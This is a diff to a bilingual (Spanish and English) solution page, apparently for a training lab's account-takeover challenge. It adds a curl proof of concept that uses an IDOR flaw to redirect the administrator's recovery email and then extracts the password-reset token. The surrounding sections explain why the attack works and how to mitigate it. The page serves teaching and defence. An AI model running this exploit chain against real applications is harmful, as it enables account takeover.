@@ -104,6 +104,21 @@
       <li>Solicita un reset para <code>administrator</code>. El enlace llega ahora al buzón del auditor.</li>
       <li>Abre el enlace, fija una contraseña nueva y autentícate como <code>administrator</code>. La aplicación mostrará <code>HL{···}</code>.</li>
     </ol>
+    <h3>PoC con la IP real del lab</h3>
+    <pre>curl -s -c /tmp/hl-ato.cookie -b /tmp/hl-ato.cookie -X POST \
+  {{ target_base }}/account-takeover/login \
+  -d "username=auditor&amp;password=Audit2026!"
+
+curl -s -c /tmp/hl-ato.cookie -b /tmp/hl-ato.cookie -X POST \
+  {{ target_base }}/account-takeover/profile/recovery-email \
+  -d "account_id=1001&amp;recovery_email=auditor@hacklabs.local"
+
+curl -s -c /tmp/hl-ato.cookie -b /tmp/hl-ato.cookie -X POST \
+  {{ target_base }}/account-takeover/reset/request \
+  -d "username=administrator"
+
+curl -s -b /tmp/hl-ato.cookie {{ target_base }}/account-takeover \
+  | grep -oE '/account-takeover/reset\?token=[A-Za-z0-9_-]+'</pre>
     <h3>Por qué funciona</h3>
     <p>El endpoint exige autenticación, pero autoriza por el <code>account_id</code> suministrado por el cliente. El reset sí está correctamente vinculado a un token de un solo uso; el takeover nace del cambio IDOR previo.</p>
     <h3>Mitigación</h3>
@@ -122,6 +137,21 @@ target_id = session.user_id
       <li>Request a password reset for <code>administrator</code>. The link now reaches the auditor mailbox.</li>
       <li>Open it, set a new password, and authenticate as <code>administrator</code>. The application reveals <code>HL{···}</code>.</li>
     </ol>
+    <h3>PoC using the actual lab IP</h3>
+    <pre>curl -s -c /tmp/hl-ato.cookie -b /tmp/hl-ato.cookie -X POST \
+  {{ target_base }}/account-takeover/login \
+  -d "username=auditor&amp;password=Audit2026!"
+
+curl -s -c /tmp/hl-ato.cookie -b /tmp/hl-ato.cookie -X POST \
+  {{ target_base }}/account-takeover/profile/recovery-email \
+  -d "account_id=1001&amp;recovery_email=auditor@hacklabs.local"
+
+curl -s -c /tmp/hl-ato.cookie -b /tmp/hl-ato.cookie -X POST \
+  {{ target_base }}/account-takeover/reset/request \
+  -d "username=administrator"
+
+curl -s -b /tmp/hl-ato.cookie {{ target_base }}/account-takeover \
+  | grep -oE '/account-takeover/reset\?token=[A-Za-z0-9_-]+'</pre>
     <h3>Why it works</h3>
     <p>The endpoint authenticates the caller but authorizes the object using a client-supplied <code>account_id</code>. The one-time reset token itself is sound; the preceding IDOR creates the takeover.</p>
     <h3>Mitigation</h3>
